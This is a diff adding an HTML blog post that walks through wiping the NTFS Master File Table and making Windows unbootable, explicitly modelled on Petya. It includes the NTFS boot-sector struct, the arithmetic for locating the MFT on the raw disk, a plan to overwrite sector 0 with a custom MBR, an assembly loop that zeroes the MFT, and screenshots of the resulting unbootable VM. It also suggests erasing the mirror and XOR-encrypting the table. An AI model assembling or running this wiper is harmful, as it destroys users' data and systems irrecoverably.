@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="../../stylesheet.css">
+  <title>Wiping The MFT from NTFS</title>
+</head>
+<body>
+  <h1>Wiping the MFT from NTFS and Making Windows Unbootable</h1>
+  <h3>29 May 2025 -- Just like our friend Ransom:Win32/Petya! -- 10-13 minute read</h3><br><br>
+
+  <h1>0: Disclaimer</h1>
+  <b>
+    This article is not meant to be a tutorial. Do not replicate actions shown here<br>
+    on real hardware! Only if you both <i>know what you're doing and really understand it</i><br>
+    <i>and that you're in a Virtual Machine</i>. Additionally, the wiping part of this article,<br>
+    will only work on Legacy BIOS systems due to requiring Ring 0 access.<br><br>
+  </b>
+
+  <i>I, mxtlrr, am not at fault for anything you do with this article.</i> You are 100%<br>
+  to blame if something occurs.
+
+  <h1>1: Introduction</h1>
+  The MFT, also known as the Master File Table, is a key part of the NTFS<br>
+  filesystem -- it is a table of <i>every file</i> on the filesystem, meaning<br>
+  if it is somehow corrupted or <a href="https://en.wikipedia.org/wiki/Petya_(malware_family)">encrypted</a>, then file recovery is potentially<br>
+  not possible. Luckily, there is a mirror (called the MFT Mirror), which is used<br>
+  if the original MFT is not accessible, stored at 2 different physical places on the disk.<br><br>
+
+  Petya is a known example of a malware strain that does this, even with <code>bootrec /fixmbr</code><br>
+  to remove the MBR Locker payload, you <i>cannot</i> access/boot into Windows due to the missing MFT.<br>
+  So, how do we do this for ourselves?
+
+  <h1>2: The NTFS BPB</h1>
+  Before we wipe it, we need to find out where this specifically is in the actual disk.<br>
+  Luckily, NTFS has its own BPB (boot parameter block), that's (seemingly?) stored at<br>
+  <i>logical sector 2048</i> (according to VBox 7.0). The structure looks like this:<br>
+  <div class="container">
+    <pre>
+      <code>
+typedef struct NTFS_Bootsect {
+  uint8_t  jmp[3];             // JMP SHORT
+  char     oem_sys[8];         // "NTFS    "
+
+  /** BOOT PARAMETER BLOCK **/
+  uint16_t bytes_p_sector;     // Bytes per sector
+  uint8_t  sect_p_cluster;     // Sectors per cluster
+  uint16_t resv_sect_counter;  // Reserved sector count
+  uint8_t  always_0[3];        // Always 0
+  uint16_t r_entry_count;      // Unused
+  uint8_t  media_desc;         // Media descriptor
+  uint16_t unused;             // Always 0
+  uint16_t sect_p_track;       // Sectors Per Track
+  uint16_t num_heads;          // Disk Head Count
+  uint32_t hidden_sect_count;  // Hidden Sector Count
+  uint64_t unused2;            // Unused
+  uint64_t total_sectors;      // Total Sectors
+
+  /** NTFS SPECIFIC HEADER **/
+  uint64_t mft_cluster;        // Master File Table Cluster
+  uint64_t mft_mirror_cluster; // Master File Table Mirror Cluster
+  uint32_t c_per_file_rec_seg; // Clusters per File record sgement
+  uint32_t c_per_index_block;  // Clusters per index block
+  uint64_t volume_serial;      // Volume Serial
+  uint32_t checksum;
+
+  uint8_t bootcode[426];
+  uint16_t end_of_sector;
+}__attribute__((packed)) NTFS_Bootsect_t;
+      </code>
+    </pre><br>
+  </div>
+
+    Note that <code>__attribute__((packed))</code> is required here. If we don't have this, then the structure's members will not<br>
+    line up. We just need to read a sector at offset <code>2048 * 512</code> (aka 1048576) from <code>\\\\.\\PhysicalDrive0</code>.<br>
+    So now, <code>NTFS_Bootsect_t* ntfs = (NTFS_Bootsect_t*)data;</code> will give us the actual NTFS BPB we're looking for!<br><br>
+
+    <h2>2.1: Where is the MFT?</h2>
+    You may notice there are two things that are important for us: <code>mft_cluster</code> and <code>mft_mirror_cluster</code>.<br>
+    For example,
+    <div class="container">
+      <pre>
+        <code>
+C:\> test.exe
+Cluster 8533 has MFT, and 0 has MFT mirror.
+        </code>
+      </pre>
+    </div>
+    Ok, great. How do we somehow convert <code>MFT Cluster -> Physical Byte Offset</code>? We'll first need<br>
+    to convert to LBA which is just the hidden sector count plus the cluster number multiplied by the sectors/cluster value.<br>
+    On my test machine, this was <code>0x112a8 (70312)</code>. Last part: for wiping, we can't really use LBA, we'd have to<br>
+    do some hard disk driver stuff, so instead, we'll just find the raw byte offset from sector 0.<br><br>
+
+    To do this, you can just multiply the bytes per sector (in NTFS BPB) by the LBA above. Note that LBA<br>
+    refers to the entire sector, so the correct "range" of the "master" MFT is:
+    <div class="container">
+      <pre>
+        <code>
+  uint64_t mft_byte_min = (ntfs->bytes_p_sector * mft_lba);
+  uint64_t mft_byte_max = (ntfs->bytes_p_sector * (mft_lba + 1));
+        </code>
+      </pre>
+    </div>
+    
+    Let's make sure we found the MFT. If we read 512 bytes and open this in a hex editor, we
+    get the following:<br><br>
+    <img src="img-29/hxd-1.png" size="25%"><br><br>
+    
+    Looks like we found it! Alright, now we can wipe it. Let's try using <code>WriteFile</code>:<br>
+    <div class="container">
+      <pre>
+        <code>
+  C:\> test.exe
+  [+]  Overwriting MFT sector with 0's...
+  [!!] Failed! Error code: 5 (ERROR_ACCESS_DENIED)
+        </code>
+      </pre>
+    </div>
+    Looks like we'll need to somehow get into ring 0. So, we'll have to overwrite sector 0<br>
+    with our own code. We're also going to need to pass the MFT location somehow.<br>
+
+    <h2>2.2: Wiping MFT</h2>
+    Here's our game plan right now: 1. Overwrite sector 0 with our custom MBR, then use<br>
+    sector 1 for data. I'll set the first four bytes of sector 1 to <code>0x02255000</code>.<br>
+    Then, when we're in 32-bit protected mode (you can use 16-bit mode if you'd like, but<br>
+    you'll have to deal with <a href="https://wiki.osdev.org/Segmentation">real mode segmentation</a>), we can just do this:
+    <div class="container">
+      <pre>
+        <code>
+  mov edi, dword [0x7E00]   ;; 0x7e00 is the start of sector 1.
+  mov esi, edi
+  add esi, 0xFFF    ;; 0x02255000 + 0xFFF, we're writing 0xFFF bytes, should be enough
+  .L1:
+    cmp edi, esi
+    je .L2
+
+    mov [edi], byte 0
+    inc edi
+    jmp .L1
+
+  .L2:
+    ...
+        </code>
+      </pre>
+    </div>
+    Note: <code>0x02255000</code> works for my testing machine. It may be different for you.
+    
+    <h1>3: Running our Code</h1>
+    Alright, let's see what happens. Booting up the VM, running our payload, we don't get any<br>
+    crashes / triple faults. Our code works! How do we make sure we actually overwrote the MFT?<br>
+    We'll boot into a Windows 7 ISO file, and try and "repair" with <code>bootrec</code>:<br><br>
+    <img src="img-29/save-build.png" size="25%"><br><br>
+    Alright, <code>bootrec</code> ran, and "succeeded", let's eject the CD and reboot.<br><br>
+    <img src="img-29/unbootable.png" size="25%"><br><br>
+    <b><i>WE DID IT!</i></b> I didn't remove the mirror in the code I tested, but it's probably<br>
+    worth implementing. Additionally we could encrypt it with some form of ROT13 or XOR encryption<br>
+    like Petya did.
+
+    <h1>4: Conclusion</h1>
+    This was more of a proof-of-concept: No, the full source code will not be available, if you<br>
+    <i>really</i> want to do this, you should be able to recreate the source code from fragments.<br>
+    Thanks for reading! This is one of the few projects I'm actually proud of.<br><br>
+
+    Additionally, I may be wrong about something (unlikely) -- i.e. the actual wiping or something else<br>
+    If this is the case and you know the right answer / what should be done instead, please do not<br>
+    hesitate to <a href="https://x.com/ingoestheheroin">reach out to me!</a>
+</body>
+</html>
